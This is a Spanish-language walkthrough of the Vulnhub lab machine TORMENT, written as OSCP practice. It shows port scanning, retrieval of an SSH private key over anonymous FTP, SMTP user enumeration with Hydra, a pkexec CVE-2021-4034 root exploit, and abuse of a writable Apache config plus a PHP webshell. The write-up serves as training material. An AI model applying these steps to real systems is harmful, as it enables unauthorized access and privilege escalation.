---
title: digitalworld.local-TORMENT Writeup - Vulnhub
date: 2025-02-25
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, digitalworld.local-TORMENT, OSCP Prep]
image:
  path: /assets/img/commons/vulnhub/torment/portada.png
---

Anterior [**OSCP Lab 11**](https://lvs3c.github.io/posts/OSCP-digitalworld.joy/)

¡Saludos!

`OSCP Lab 12`

En este writeup, realizaremos la máquina [**digitalworld.local: TORMENT**](https://www.vulnhub.com/entry/digitalworldlocal-torment,299/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Servicio FTP** para obtener datos relevantes.
- **Pidgin** software para obtener acceso a un chat y obtener la clave de id_rsa.
- **Hydra** para validar usuarios mediante **SMTP**.
- Y por último, dos formas de elevar nuestro privilegio convirtiéndonos en root y así obtener la flag del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
[sudo] password for lvs3c:
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.26     00:0c:29:c5:c1:bf       VMware, Inc.
10.11.12.200    00:50:56:e3:e2:d6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.493 seconds (102.69 hosts/sec). 3 responded```

```bash
❯ ping -c 1 10.11.12.26
PING 10.11.12.26 (10.11.12.26) 56(84) bytes of data.
64 bytes from 10.11.12.26: icmp_seq=1 ttl=64 time=0.356 ms

--- 10.11.12.26 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.356/0.356/0.356/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.26 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 16:20 -03
Nmap scan report for 10.11.12.26
Host is up (0.0020s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
631/tcp   open  ipp
2049/tcp  open  nfs
6667/tcp  open  irc
6668/tcp  open  irc
6669/tcp  open  irc
6672/tcp  open  vision_server
6674/tcp  open  unknown
34515/tcp open  unknown
36105/tcp open  unknown
41493/tcp open  unknown
42967/tcp open  unknown
MAC Address: 00:0C:29:C5:C1:BF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.38 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p21,22,25,80,111,139,143,445,631,2049,6667,6668,6669,6672,6674,34515,36105,41493,42967 -sCV 10.11.12.26 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 16:26 -03
Nmap scan report for 10.11.12.26
Host is up (0.00015s latency).

PORT      STATE SERVICE        VERSION
21/tcp    open  ftp            vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.12.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
| -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
| -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
| -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
| -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
| -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
| -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz
| -rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.5.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
| -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
22/tcp    open  ssh            OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey:
|   2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)
|   256 a5:12:e7:7f:f0:17:ce:f1:6a:a5:bc:1f:69:ac:14:04 (ECDSA)
|_  256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)
25/tcp    open  smtp           Postfix smtpd
|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp    open  http           Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25
|_http-title: Apache2 Debian Default Page: It works
111/tcp   open  rpcbind        2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      36105/tcp   mountd
|   100005  1,2,3      43110/udp6  mountd
|   100005  1,2,3      44817/udp   mountd
|   100005  1,2,3      51217/tcp6  mountd
|   100021  1,3,4      42967/tcp   nlockmgr
|   100021  1,3,4      45627/tcp6  nlockmgr
|   100021  1,3,4      48602/udp6  nlockmgr
|   100021  1,3,4      56235/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn    Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap           Dovecot imapd
|_imap-capabilities: SASL-IR have post-login listed capabilities IMAP4rev1 more ENABLE AUTH=LOGINA0001 ID LITERAL+ OK Pre-login IDLE AUTH=PLAIN LOGIN-REFERRALS
445/tcp   open  netbios-ssn    Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp            CUPS 2.2
|_http-title: Home - CUPS 2.2.1
| http-robots.txt: 1 disallowed entry
|_/
2049/tcp  open  nfs            3-4 (RPC #100003)
6667/tcp  open  irc?
|_irc-info: Unable to open connection
| fingerprint-strings:
|   HTTPOptions:
|_    ERROR :Connection refused, too many connections from your IP address
6668/tcp  open  irc?
|_irc-info: Unable to open connection
| fingerprint-strings:
|   HTTPOptions:
|_    ERROR :Connection refused, too many connections from your IP address
6669/tcp  open  irc?
|_irc-info: Unable to open connection
| fingerprint-strings:
|   HTTPOptions:
|_    ERROR :Connection refused, too many connections from your IP address
6672/tcp  open  vision_server?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, Help, LANDesk-RC, NCP, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServer, X11Probe:
|_    ERROR :Connection refused, too many connections from your IP address
6674/tcp  open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, Help, JavaRMI, NCP, RPCCheck, RTSPRequest, SMBProgNeg, WMSRequest, X11Probe:
|_    ERROR :Connection refused, too many connections from your IP address
34515/tcp open  mountd         1-3 (RPC #100005)
36105/tcp open  mountd         1-3 (RPC #100005)
41493/tcp open  mountd         1-3 (RPC #100005)
42967/tcp open  nlockmgr       1-4 (RPC #100021)
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6667-TCP:V=7.94SVN%I=7%D=2/25%Time=67BE1980%P=x86_64-pc-linux-gnu%r
SF:(HTTPOptions,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20con
SF:nections\x20from\x20your\x20IP\x20address\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6668-TCP:V=7.94SVN%I=7%D=2/25%Time=67BE1980%P=x86_64-pc-linux-gnu%r
SF:(HTTPOptions,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20con
SF:nections\x20from\x20your\x20IP\x20address\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6669-TCP:V=7.94SVN%I=7%D=2/25%Time=67BE1980%P=x86_64-pc-linux-gnu%r
SF:(HTTPOptions,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20con
SF:nections\x20from\x20your\x20IP\x20address\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6672-TCP:V=7.94SVN%I=7%D=2/25%Time=67BE1979%P=x86_64-pc-linux-gnu%r
SF:(RTSPRequest,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20con
SF:nections\x20from\x20your\x20IP\x20address\r\n")%r(RPCCheck,46,"ERROR\x2
SF:0:Connection\x20refused,\x20too\x20many\x20connections\x20from\x20your\
SF:x20IP\x20address\r\n")%r(DNSVersionBindReqTCP,46,"ERROR\x20:Connection\
SF:x20refused,\x20too\x20many\x20connections\x20from\x20your\x20IP\x20addr
SF:ess\r\n")%r(DNSStatusRequestTCP,46,"ERROR\x20:Connection\x20refused,\x2
SF:0too\x20many\x20connections\x20from\x20your\x20IP\x20address\r\n")%r(He
SF:lp,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20connections\x
SF:20from\x20your\x20IP\x20address\r\n")%r(SSLSessionReq,46,"ERROR\x20:Con
SF:nection\x20refused,\x20too\x20many\x20connections\x20from\x20your\x20IP
SF:\x20address\r\n")%r(X11Probe,46,"ERROR\x20:Connection\x20refused,\x20to
SF:o\x20many\x20connections\x20from\x20your\x20IP\x20address\r\n")%r(FourO
SF:hFourRequest,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20con
SF:nections\x20from\x20your\x20IP\x20address\r\n")%r(LANDesk-RC,46,"ERROR\
SF:x20:Connection\x20refused,\x20too\x20many\x20connections\x20from\x20you
SF:r\x20IP\x20address\r\n")%r(TerminalServer,46,"ERROR\x20:Connection\x20r
SF:efused,\x20too\x20many\x20connections\x20from\x20your\x20IP\x20address\
SF:r\n")%r(NCP,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20conn
SF:ections\x20from\x20your\x20IP\x20address\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6674-TCP:V=7.94SVN%I=7%D=2/25%Time=67BE1979%P=x86_64-pc-linux-gnu%r
SF:(RTSPRequest,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20con
SF:nections\x20from\x20your\x20IP\x20address\r\n")%r(RPCCheck,46,"ERROR\x2
SF:0:Connection\x20refused,\x20too\x20many\x20connections\x20from\x20your\
SF:x20IP\x20address\r\n")%r(DNSVersionBindReqTCP,46,"ERROR\x20:Connection\
SF:x20refused,\x20too\x20many\x20connections\x20from\x20your\x20IP\x20addr
SF:ess\r\n")%r(DNSStatusRequestTCP,46,"ERROR\x20:Connection\x20refused,\x2
SF:0too\x20many\x20connections\x20from\x20your\x20IP\x20address\r\n")%r(He
SF:lp,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20connections\x
SF:20from\x20your\x20IP\x20address\r\n")%r(SMBProgNeg,46,"ERROR\x20:Connec
SF:tion\x20refused,\x20too\x20many\x20connections\x20from\x20your\x20IP\x2
SF:0address\r\n")%r(X11Probe,46,"ERROR\x20:Connection\x20refused,\x20too\x
SF:20many\x20connections\x20from\x20your\x20IP\x20address\r\n")%r(FourOhFo
SF:urRequest,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20connec
SF:tions\x20from\x20your\x20IP\x20address\r\n")%r(NCP,46,"ERROR\x20:Connec
SF:tion\x20refused,\x20too\x20many\x20connections\x20from\x20your\x20IP\x2
SF:0address\r\n")%r(JavaRMI,46,"ERROR\x20:Connection\x20refused,\x20too\x2
SF:0many\x20connections\x20from\x20your\x20IP\x20address\r\n")%r(WMSReques
SF:t,46,"ERROR\x20:Connection\x20refused,\x20too\x20many\x20connections\x2
SF:0from\x20your\x20IP\x20address\r\n");
MAC Address: 00:0C:29:C5:C1:BF (VMware)
Service Info: Hosts:  TORMENT.localdomain, TORMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2h39m59s, deviation: 4h37m07s, median: 0s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: torment
|   NetBIOS computer name: TORMENT\x00
|   Domain name: \x00
|   FQDN: torment
|_  System time: 2025-02-26T03:28:55+08:00
|_nbstat: NetBIOS name: TORMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2025-02-25T19:28:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.81 seconds
```

El informe de `Nmap` nos revela:
- Puerto `21` servidor `vsftpd 2.0.8 or later`.
- Puerto `22` servidor `OpenSSH 7.4p1`.
- Puerto `25` servidor `Postfix smtpd`.
- Puerto `80` servidor `Apache httpd 2.4.25`.
- Puerto `111` servidor `rpcbind`.
- Puerto `139` servidor `Samba smbd 3.X - 4.X`.
- Puerto `143` servidor `Dovecot imapd`.
- Puerto `445` servidor `Samba smbd 4.5.12-Debian`.
- Puerto `631` servidor `CUPS 2.2`.
- Puerto `2049` servidor `nfs`.
- Puerto `6667-6668-6669` servidor `irc`.
- Puerto `34515-36105-41493` servidor `mountd`.
- Puerto `42967` servidor `nlockmgr`.


### FTP - 21

Ingresamos al servicio `FTP`{: .filepath} con usuario `anonymous`.

```bash
❯ ftp 10.11.12.26
Connected to 10.11.12.26.
220 vsftpd (broken)
Name (10.11.12.26:lvs3c): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||44234|)
150 Here comes the directory listing.
drwxr-xr-x   11 ftp      ftp          4096 Jan 04  2019 .
drwxr-xr-x   11 ftp      ftp          4096 Jan 04  2019 ..
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .cups
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .ftp
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .imap
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .mysql
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .nfs
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ngircd
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .samba
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .smtp
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ssh
-rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
-rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
-rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
-rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
-rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
-rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
-rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
-rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.4.gz
-rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.5.gz
-rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
-rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.1.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.2.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.3.gz
-rw-r--r--    1 ftp      ftp        489389 Dec 28  2018 dpkg.status.4.gz
-rw-r--r--    1 ftp      ftp        470278 Dec 27  2018 dpkg.status.5.gz
-rw-r--r--    1 ftp      ftp        463754 Dec 23  2018 dpkg.status.6.gz
-rw-------    1 ftp      ftp          1010 Dec 31  2018 group.bak
-rw-------    1 ftp      ftp           840 Dec 31  2018 gshadow.bak
-rw-------    1 ftp      ftp          2485 Dec 31  2018 passwd.bak
-rw-------    1 ftp      ftp          1575 Dec 31  2018 shadow.bak
226 Directory send OK.
```

Descargamos el contenido de los directorio `.ssh` y `.ngircd`.

```bash
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||40794|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1766 Jan 04  2019 id_rsa
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||46539|)
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
100% |*****************************************************************************************************************************************************************************************************|  1766       26.31 MiB/s    00:00 ETA
226 Transfer complete.
1766 bytes received in 00:00 (4.30 MiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> cd .ngircd
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42038|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jan 04  2019 channels
226 Directory send OK.
ftp> get channels
local: channels remote: channels
229 Entering Extended Passive Mode (|||48483|)
150 Opening BINARY mode data connection for channels (33 bytes).
100% |*****************************************************************************************************************************************************************************************************|    33      786.01 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (88.29 KiB/s)
ftp>
```

Tenemos una clave privada (id_rsa) y canales de un chat (channels) IRC.

![ftp](/assets/img/commons/vulnhub/torment/ftp.png){: .center-image }

Buscamos por internet la configuración por default del archivo de configuración de ngircd, buscando la contraseña por default.

![ngircd_pass](/assets/img/commons/vulnhub/torment/ngircd_pass.png){: .center-image }

Probamos.

![pidgin1](/assets/img/commons/vulnhub/torment/pidgin1.png){: .center-image }
![pidgin2](/assets/img/commons/vulnhub/torment/pidgin2.png){: .center-image }

Tenemos la frase, posiblemente sea la clave del archivo id_rsa, necesitamos saber los usuarios.

### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.26
http://10.11.12.26 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.25], IP[10.11.12.26], Title[Apache2 Debian Default Page: It works]
```

Lanzamos `gobuster` para validar directorios ocultos y encontramos poca información.

![apache](/assets/img/commons/vulnhub/torment/apache.png){: .center-image }
![robots](/assets/img/commons/vulnhub/torment/robots.png){: .center-image }
![secret](/assets/img/commons/vulnhub/torment/secret.png){: .center-image }


### HTTP - 631

Validando el puerto 631 encontramos una lista de posibles usuarios.

![users](/assets/img/commons/vulnhub/torment/users.png){: .center-image }


Validamos la lista mediante hydra contra el servicio `smtp`{: .filepath}.

```bash
❯ hydra -L users smtp-enum://10.11.12.26
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-26 20:27:33
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking smtp-enum://10.11.12.26:25/
[25][smtp-enum] host: 10.11.12.26   login: Patrick
[25][smtp-enum] host: 10.11.12.26   login: Qiu
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-26 20:27:44
```

Tenemos dos usuarios válidos.

## Explotación

---

Ya tenemos:
- Usuarios válidos
- archivo id_rsa para conectanos por ssh y su posible clave

Damos permiso 600 a la clave e ingresamos por SSH.

```bash
❯ chmod 600 id_rsa

❯ ssh -i id_rsa patrick@10.11.12.26
The authenticity of host '10.11.12.26 (10.11.12.26)' can't be established.
ED25519 key fingerprint is SHA256:saGAy7DktmEDsSDdp7nZm3zj+aIhdw5tMgGaNH+HGsQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.12.26' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan  4 19:34:43 2019 from 192.168.254.139
patrick@TORMENT:~$
```


## Escalación de privilegios

---

Listamos los binarios SUID y los permisos del usuario sobre el sistema operativo.

```bash
patrick@TORMENT:~$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/umount
/bin/mount
/bin/su
/bin/ntfs-3g
/bin/ping
/sbin/mount.nfs
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/sbin/pppd
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device

patrick@TORMENT:~$ sudo -l
Matching Defaults entries for patrick on TORMENT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on TORMENT:
    (ALL) NOPASSWD: /bin/systemctl poweroff, /bin/systemctl halt, /bin/systemctl reboot
patrick@TORMENT:~$
```

>Podemos elevar nuestros privilegios de varias maneras, vamos a ver dos.
{: .prompt-tip }

- Explotando binario SUID pkexec. 

```bash
patrick@TORMENT:/tmp$ ./CVE-2021-4034.py
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f5470cc94e0 at 0x7f546f88e898>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
uid=0(root) gid=1001(patrick) groups=1001(patrick)
# cd /root
# ls
author-secret.txt  proof.txt

# cat author-secret.txt
This is the fourth Linux box written successfully by this author.

Unlike the first three, this had no MERCY, took some DEVELOPMENT and required a sheer ton of BRAVERY.

Setting puzzles has been an author's joy, even though some of these puzzles may be rather mind-bending. The idea is that, even if we are repeatedly testing the basics, the basics can be morphed into so many different forms. The TORMENT box is a fine example.

The privilege escalation, in particular, was inspired from what people would usually learn in Windows privilege escalation --- weak service permissions. In this case, this was extended to Linux through something a little different. Before you think this is fictitious, think for a second --- how many developers have you heard became too lazy to test new configurations, and so decided to chmod 777 themselves? Also, if they can't log in as root directly, they cannot as easily modify /var/www/html, so they'd come up with silly ideas there as well.

Sigh, a New Year's eve disappeared from rushing out this box. But I think it is worth it.

Happy 2019, and many more good years beyond!

Soon I will be writing Windows boxes; these you may be able to find on Wizard-Labs, as a favour for a friend. Otherwise you can find me on my site. Root one of the earlier boxes I had to find out where this is.

# cat proof.txt
Congrutulations on rooting TORMENT. I hope this box has been as fun for you as it has been for me. :-)

Until then, try harder!
```

- Servicio Apache, User Pivoting

Listando los procesos, observamos que el servicio apache es lanzado por el usuario root y que además tenemos permiso total sobre el archivo de configuración de apache.

![apache2](/assets/img/commons/vulnhub/torment/apache2.png){: .center-image }

```bash
patrick@TORMENT:~$ ls -l /etc/apache2/apache2.conf
-rwxrwxrwx 1 root root 7224 Nov  4  2018 /etc/apache2/apache2.conf
```

El usario Patrick tiene permiso de root para reiniciar el servidor, con lo cual podemos modificar el archivo `apache2.conf`.

Editamos el archivo añadiendo usuario y grupo a `qiu`. Reiniciamos y observamos que ahora el servicio es iniciado por este usuario.

![qiu](/assets/img/commons/vulnhub/torment/qiu.png){: .center-image }
![qiu2](/assets/img/commons/vulnhub/torment/qiu2.png){: .center-image }

Ahora nos queda crear un archivo para generarnos la reverse shell y elevar privilegios partiendo de este usuario.

Tenemos permisos en el directorio `/var/www/html`, creamos `cmd.php`{: .filepath}.

![qiu3](/assets/img/commons/vulnhub/torment/qiu3.png){: .center-image }
![qiu4](/assets/img/commons/vulnhub/torment/qiu4.png){: .center-image }
![qiu5](/assets/img/commons/vulnhub/torment/qiu5.png){: .center-image }

Listamos los permisos del usuario `qiu` y tenemos permiso de root sobre python, elevar privilegio es sencillo.

![qiu6](/assets/img/commons/vulnhub/torment/qiu6.png){: .center-image }

![qiu7](/assets/img/commons/vulnhub/torment/qiu7.png){: .center-image }

Hope it helps!